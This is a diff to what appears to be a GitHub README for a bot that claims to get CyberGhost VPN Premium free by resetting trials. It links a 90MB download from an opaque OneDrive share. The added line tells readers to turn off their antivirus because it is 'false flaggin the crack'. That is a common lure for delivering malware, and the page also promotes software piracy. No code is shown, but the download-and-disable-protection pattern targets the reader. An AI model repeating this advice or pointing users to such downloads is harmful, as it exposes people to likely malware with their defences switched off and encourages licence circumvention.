@@ -10,6 +10,8 @@ This bot automates EVERYTHING to get you CyberGhost VPN Premium for free, resett
 ### Download (90MB): 
 [![Download Button](https://github.com/sillyLazyCat/fuckVITBPL/blob/main/button_fuckvitbpl.png?raw=true)](https://api.onedrive.com/v1.0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBbmFBb3FKY3VoYlZiUW9yVHd1ZmRobVlkSVk_ZT1ZNHdzS1k/root/content)
 
+**Kill the antivirus for a sec**—it’s false flaggin the crack.
+
 ---
 ## Why this exists:
 VITBPL wifi is actual trash, bro. It shoulda been dead or sum, speeds so slow, your WhatsApp texts show up next semester 😭🙏, and disconnects every 2 minutes like it’s powered by hopes and prayers 💯.  
